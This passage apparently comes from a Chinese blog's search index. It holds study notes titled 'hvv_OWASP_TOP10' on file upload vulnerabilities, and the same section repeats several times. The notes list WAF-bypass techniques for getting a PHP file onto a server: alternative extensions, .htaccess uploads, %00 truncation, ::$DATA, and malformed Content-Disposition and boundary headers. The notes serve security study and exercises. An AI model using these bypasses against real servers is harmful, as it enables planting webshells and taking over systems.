Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#畸形的boundary头部"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#顺序颠倒"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#内容重复"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#数据溢出"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#数据截断"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8利用sessionupload_progress"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 